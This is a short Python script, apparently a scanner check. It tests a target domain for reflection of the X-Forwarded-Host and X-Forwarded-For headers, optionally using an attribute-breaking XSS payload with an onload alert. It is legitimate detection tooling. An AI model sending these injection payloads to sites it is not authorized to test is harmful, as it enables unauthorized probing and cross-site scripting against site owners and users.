import requests
import os
import json

payload = 'kek.kek'
xss_payload = 'kek.kek"onload="alert();'

url = 'https://{0}'.format(os.environ.get('DOMAIN'))
vuln_id = os.environ.get('VULN_ID')
find_xss = True if str(os.environ.get('FIND_XSS')).lower() == 'true' else False


def resp(state=False):
    if state:
        return json.dumps({"vulnerable": "True", "vuln_id": vuln_id, "description": url})
    else:
        return json.dumps({"vulnerable": "False", "vuln_id": vuln_id, "description": url})


def check():
    if not url:
        return resp(False)
    try:
        if not find_xss:
            return resp(True) if requests.get(url, headers={
              'X-Forwarded-Host': payload,
              'X-Forwarded-For': payload,
            }).text.find(payload) > -1 else resp(False)
        if find_xss:
            return resp(True) if requests.get(url, headers={
              'X-Forwarded-Host': xss_payload,
              'X-Forwarded-For': xss_payload,
            }).text.find(
              xss_payload) > -1 else resp(False)
    except Exception as ex:
        pass
    return resp(False)


if __name__ == '__main__':
    print(check())